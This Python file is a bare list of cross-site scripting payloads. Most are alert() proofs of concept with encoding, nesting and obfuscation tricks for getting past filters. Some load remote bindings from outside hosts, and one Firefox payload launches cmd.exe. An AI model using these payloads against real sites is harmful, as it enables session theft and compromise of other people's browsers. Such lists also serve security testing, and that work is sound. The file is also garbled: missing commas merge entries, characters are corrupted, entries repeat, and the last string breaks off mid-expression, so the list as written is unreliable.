# -*- coding: utf-8 -*-

payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>Click Me</a>",
    "<img src='http://invalid' onerror='alert(1)'>",
    "<input type='text' value='<img src=x onerror=alert(1)>'>",
    "'><script>{JAVASCRIPT}</script>"
    "'><script>{JAVASCRIPT}</script><'"
    "<SCRIPT>{JAVASCRIPT};</SCRIPT>"
    "<scri<script>pt>{JAVASCRIPT};</scr</script>ipt>"
    "<SCRI<script>PT>{JAVASCRIPT};</SCR</script>IPT>"
    "<scri<scr<script>ipt>pt>{JAVASCRIPT};</scr</sc</script>ript>ipt>"
    "';{JAVASCRIPT};'"
    "<SCR%00IPT>{JAVASCRIPT}</SCR%00IPT>"
    "\";{JAVASCRIPT};//"
    "<STYLE TYPE='text/javascript'>{JAVASCRIPT};</STYLE>"
    "<<SCRIPT>{JAVASCRIPT}//<</SCRIPT>"
    "'{EVENTHANDLER}={JAVASCRIPT}'"
    "<IFRAME SRC='f' onerror='{JAVASCRIPT}'></IFRAME>"
    "onload='{JAVASCRIPT}'"
    "<script>var a = '</script> <script> alert('XSS !'); </script> <script>"
    "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->"
    "<META HTTP-EQUIV='Set-Cookie' Content='USERID=<SCRIPT>alert('XSS')</SCRIPT>'>"
    "s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'aspendChild(i);"
    "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>"
    '''    
    <script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
    <!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
    */a=eval;b=alert;a(b(/e/.source));/*
    <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
    </TITLE><SCRIPT>alert("XSS");</SCRIPT>
    \";alert('XSS');//
    /<script((\s+\w+(\s*=\s*(?:â€(.)*?â€|'(.)*?'|[^'â€>\s]+))?)+\s*|\s*)src/i
    <<SCRIPT>alert("XSS");//<</SCRIPT>
    firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
    <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
    '';!--"<script>alert(0);</script>=&{(alert(1))}
    style=color: expression(alert(0));" a="
    vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
    <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
    s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
    s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
    s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
    s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
    s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
    <BR SIZE="&{alert('XSS')}">
    <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
    <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
    <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
    <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
    sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
    b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
    setTimeout// (name// ,0)
    test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
    <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
    </noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code> 
    <BODY BACKGROUND="javascript:alert('XSS');">
    <BODY ONLOAD=alert('XSS')>
    <body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
    <body onload=a1={x:this.parent.document};a1.x.writeln(1);>
    <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
    <BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert("XSS")>
    <body onload=;;;;;;;;;;;_=alert;_(1);;;;
    <body <body onload=;;;;;al:'';;>
    <body/s/onload=x={doc:parent.document};x.doc.writeln(1)
    <body/â€â€$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
    <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
    $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
    <style>body:after{content: â€œ\61\6c\65\72\74\28\31\29â€³}</style><script>eval(eval(document.styleSheets[0].cssRules[0].style.content))</script>
    <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
    HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
    <BODY BACKGROUND="javascript:alert('XSS')">
    <BODY ONLOAD=alert('XSS')>
    <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
    <BODY BACKGROUND="javascript:alert('XSS')">
    <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
    <body/onload=&lt;!--&gt;&#10alert(1)>
    <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
    &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
    <body/onload=&lt;!--&gt;&#10alert(1)>
    <BODY BACKGROUND=�javascript:alert(�XSS�)�>
    <BODY ONLOAD=alert(�XSS�)>
    <BODY ONLOAD=alert('hellox worldss')>
    <body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
    &lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
    &lt;BODY ONLOAD=alert('XSS')&gt;
    &lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
    &lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
    &lt;HTML&gt;&lt;BODY&gt;
    &lt;/BODY&gt;&lt;/HTML&gt;
    &lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
    <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
    <BODY BACKGROUND="javascript:alert('XSS')">
    <body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
    <body background=javascript:'"><script>alert(XSS)</script>></body>
    <form name=document><image name=body>
    <body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
    <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
    <svg%0Aonauxclick=0;[1].some(confirm)//
    <a"/onclick=(confirm)()>click
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
    <sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”>
    <iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))>
    <a href=”j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this[‘document’][‘cookie’]&rpar;”>X</a>
    <iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
    %0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
    %253%63svg%2520onload=alert(1)%253%65
    <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
    <select><noembed></select><script x=’a@b’a>y=’a@b’//a@b%0a\u0061lert(1)</script x>
    <a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>
    <div/style=\\-\\mo\\z\\-b\\i\\nd\\in\\g:\\url(//business\\i\\nfo.co.uk\\/labs\\/xbl\\/xbl\\.xml\\#xss)>
    <divstyle=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>
    <div&nbsp &nbsp style=\\-\\mo\\z\\-b\\i\\nd\\in\\g:\\url(//business\\i\\nfo.co.uk\\/labs\\/xbl\\/xbl\\.xml\\#xss)>
    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
    <DIV STYLE="width: expression(alert('XSS'));">
    <DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">
    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">
    <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
    <DIV STYLE="width: expression(alert('XSS'));">
    <div/style="width:expression(confirm(1))">X</div> {IE7}
    <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
    <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
    <div/onmouseover='alert(1)'> style="x:">
    <div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
    <div style="font-family:'foo&#10;;color:red;';">LOL
    &lt;DIV STYLE=\\"background-image&#58; url(javascript&#058;alert('XSS'))\\"&gt;
    &lt;DIV STYLE=\\"background-image&#58;\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028&#46;1027\\0058&#46;1053\\0053\\0027\\0029'\\0029\\"&gt;
    &lt;DIV STYLE=\\"background-image&#58; url(javascript&#058;alert('XSS'))\\"&gt;
    &lt;DIV STYLE=\\"width&#58; expression(alert('XSS'));&#34;&gt;
    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">
    <DIV STYLE="width: expression(alert('XSS'));">
    <DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV id=XSS STYLE="width: expression(alert('XSS'));">
    <DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV id=XSS STYLE="width: expression(alert('XSS'));">
    <DIV STYLE="background-image: url(javascript:alert('XSS'));">
    <div onmouseover="alert('XSS');">,
    <DIV id=XSS STYLE="binding: url(javascript:alert('XSS'));">
    <div datafld="b" dataformatas="html" dataid=XSS SRC="#XSS"></div>
    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV STYLE="width: expression(alert('XSS'));">
    <div style="x:expression(alert(1))">Joker</div>
    <div style="x:\\65\\78\\70\\72\\65\\73\\73\\69\\6f\\6e(alert(1))">Joker</div>
    <div style="x:\\000065\\000078\\000070\\000072\\000065\\000073\\000073\\000069\\00006f\\00006e(alert(1))">Joker</div>
    <div style="x:\\65\\78\\70\\72\\65\\73\\73\\69\\6f\\6e\\028 alert \\028 1 \\029 \\029">Joker</div>
    <div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
    <div id="alert(/@0x6D6172696F/)" style="x:expression(eval)(id)">
    <div style="color:rgb(''&#0;x:expression(alert(URL=1))"></div>
    <div id=d><x xmlns="><body onload=alert(1)"><script>d.innerHTML=‘’</script
    <div style="x:expression((window.r==1)?'':eval('r=1;
'''
]